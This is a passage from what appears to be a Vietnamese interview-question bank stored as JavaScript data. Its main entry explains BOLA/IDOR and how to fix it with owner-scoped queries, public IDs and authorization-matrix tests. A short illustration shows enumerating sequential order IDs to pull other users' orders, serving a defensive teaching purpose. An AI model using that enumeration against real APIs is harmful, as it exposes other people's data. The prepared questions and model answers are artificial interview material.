    'Grace period cho refresh đồng thời mở ra lỗ hổng gì, và giới hạn nó thế nào?',
    'Redis lưu session bị failover mất dữ liệu vài giây: người dùng bị ảnh hưởng ra sao, bạn chấp nhận hay thiết kế lại?',
    'Với SPA, vì sao mô hình BFF (token giữ ở server, trình duyệt chỉ có session cookie) đang được khuyến nghị?'
  ],
  tags: ['JWT', 'Session', 'Refresh Token Rotation', 'Revocation', 'Spring Session', 'Logout All Devices'],
  refs: [
    { type: 'doc', title: 'OWASP Session Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html' },
    { type: 'doc', title: 'RFC 9700: Best Current Practice for OAuth 2.0 Security', url: 'https://datatracker.ietf.org/doc/html/rfc9700' },
    { type: 'doc', title: 'Spring Session Reference', url: 'https://docs.spring.io/spring-session/reference/' }
  ]
},
{
  id: 'security-024',
  topic: 'security',
  level: 'senior',
  q: 'API của bạn dùng ID tự tăng trên URL, ví dụ {{GET /orders/10482}}. Pentest báo lỗi BOLA. Đổi sang UUID có giải quyết được không? Bạn sửa và ngăn tái phát thế nào?',
  a: `**Tóm tắt:** Đổi sang UUID **không** sửa được BOLA, vì lỗi nằm ở chỗ server không kiểm tra "user này có quyền với object này không". UUID chỉ làm việc **đoán** ID khó hơn. Cách sửa đúng gồm 3 lớp: kiểm tra quyền theo owner ở tầng service (bắt buộc), ID khó đoán ở API boundary (giảm enumeration và lộ thông tin kinh doanh), và test tự động cho ma trận quyền để lỗi không quay lại.

### 1. BOLA là gì và vì sao ID tuần tự làm nó tệ hơn
BOLA (Broken Object Level Authorization) đứng **số 1** trong OWASP API Security Top 10 (API1:2023). Nó chính là IDOR áp dụng cho API: endpoint nhận ID từ client rồi trả object mà không kiểm tra quyền sở hữu.

~~~text
User A (đã đăng nhập) gọi GET /orders/10482  -> 200, đơn của A   (đúng)
User A đổi số:          GET /orders/10481  -> 200, đơn của B   (BOLA!)
Script lặp 1..10482                          -> tải toàn bộ đơn hàng
~~~
Với ID tuần tự, kẻ tấn công **không cần đoán**: cứ trừ 1. Ngay cả khi không có BOLA, ID tuần tự vẫn lộ thông tin: tạo đơn lúc 9h được id 10482, lúc 10h được 10982, suy ra shop có khoảng 500 đơn/giờ. Đối thủ dùng cách này để ước lượng doanh số.

### 2. Lớp 1 (bắt buộc): kiểm tra quyền theo owner ở tầng service
Quy tắc: **mọi truy vấn lấy object theo ID phải kèm điều kiện người sở hữu**, đặt ở service/repository để mọi đường gọi (REST, GraphQL, message consumer, batch) đều đi qua.

~~~java
public OrderDto getOrder(String publicId, UserPrincipal me) {
    // Điều kiện owner nằm NGAY TRONG query: không có kiểu "lấy ra rồi mới if"
    Order o = orderRepo.findByPublicIdAndCustomerId(publicId, me.customerId())
        .orElseThrow(() -> new NotFoundException("ORDER_NOT_FOUND")); // 404, không phải 403
    return mapper.toDto(o);
}
~~~
- Trả **404** thay vì 403 khi object không thuộc user: 403 xác nhận "ID này tồn tại", vẫn là rò rỉ thông tin.
- Object lồng nhau ({{/orders/:orderId/items/:itemId}}) phải kiểm tra **item thuộc order và order thuộc user**, không chỉ kiểm tra order.
- Đừng tin ID trong body: {{PUT /orders/1}} với body {{customerId: 2}} cũng là BOLA nếu service dùng giá trị đó.

### 3. Lớp 2: lớp dịch ID tại API boundary
Giữ khoá chính {{BIGINT}} nội bộ (join nhanh, index nhỏ), nhưng ra ngoài chỉ dùng **public id**.

| Cách | Cơ chế | Ưu | Nhược |
|---|---|---|---|
| Cột {{public_id}} UUID/ULID riêng | Sinh ngẫu nhiên khi insert, có unique index | Không đoán được, không lộ số lượng | Thêm cột + index, phải tra theo public_id |
| UUID làm luôn khoá chính | Không cần dịch | Đơn giản | UUIDv4 ngẫu nhiên làm index B-tree phân mảnh, khoá lớn hơn (16 byte so với 8) |
| Hashids/Sqids | Mã hoá số thành chuỗi ngắn bằng "salt" | Không thêm cột, URL ngắn | **Không phải mã hoá an toàn**: lộ salt hoặc có nhiều mẫu là giải ngược được; chỉ để che, không để bảo vệ |

Lớp này là **phòng thủ chiều sâu**: nó giảm thiệt hại khi lớp 1 bị quên ở một endpoint mới, và chặn việc suy ra số liệu kinh doanh. Nhưng UUID vẫn lộ qua log, email, link chia sẻ, nên tuyệt đối không coi "khó đoán" là "đã phân quyền".

### 4. Lớp 3: test tự động cho quyền
Lỗi BOLA thường quay lại khi có endpoint mới. Viết test **ma trận**: với mỗi endpoint có ID, user A tạo object, user B thử đọc/sửa/xoá, kỳ vọng 404.

~~~java
@ParameterizedTest
@MethodSource("ownedEndpoints") // ví dụ: GET/PUT/DELETE /orders/{id}, GET /orders/{id}/invoice
void otherUserCannotAccess(HttpMethod method, String pathTemplate) throws Exception {
    String id = createOrderAs("alice");                       // chủ sở hữu
    mvc.perform(request(method, pathTemplate, id)
            .with(jwt().jwt(j -> j.subject("bob"))))           // user khác
       .andExpect(status().isNotFound());
}
~~~
Thêm một test "kiểm kê": quét mọi handler có {{@PathVariable}} tên chứa "id" (qua {{RequestMappingHandlerMapping}}) và fail nếu endpoint đó chưa nằm trong danh sách test ma trận. Như vậy dev thêm API mới mà quên test sẽ bị CI chặn.

### 5. Pitfall production
- Chỉ kiểm tra quyền ở API Gateway theo route: gateway không biết object 10481 thuộc ai.
- Kiểm tra quyền rồi mới query lần hai không kèm owner (race, hoặc sửa code sau này bỏ mất bước kiểm tra).
- Endpoint export/batch ({{/orders/export?ids=1,2,3}}) quên lọc owner cho từng phần tử.
- Rate limit không thay được phân quyền, nhưng nên có để phát hiện enumeration: một user gặp hàng trăm lỗi 404 liên tiếp trên {{/orders/*}} là tín hiệu cần alert.

> Senior tip: khi nhận báo cáo BOLA, đừng chỉ vá endpoint bị báo. Tôi grep toàn bộ repository method dạng {{findById(}} được gọi từ controller/service phục vụ user cuối và thay bằng biến thể có owner, rồi bật test kiểm kê trong CI. Cách này thường tìm thêm vài endpoint cùng lỗi mà pentest chưa chạm tới.`,
  follow: [
    'Với hệ thống multi-tenant, bạn đảm bảo mọi query đều lọc tenant_id thế nào (Hibernate filter, PostgreSQL Row Level Security)?',
    'Nhân viên CSKH cần xem đơn của khách: thiết kế quyền và audit thế nào để không mở lại BOLA?',
    'Vì sao trả 404 thay vì 403, và có trường hợp nào nên trả 403?'
  ],
  tags: ['BOLA', 'IDOR', 'OWASP API Security', 'Enumeration', 'UUID', 'Hashids', 'Authorization Testing'],
  refs: [
    { type: 'doc', title: 'OWASP API1:2023 Broken Object Level Authorization', url: 'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/' },
    { type: 'doc', title: 'OWASP Insecure Direct Object Reference Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html' },
    { type: 'doc', title: 'OWASP Authorization Testing Automation Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html' },
    { type: 'doc', title: 'Spring Security Testing: OAuth 2.0', url: 'https://docs.spring.io/spring-security/reference/servlet/test/mockmvc/oauth2.html' }
  ]
},
);
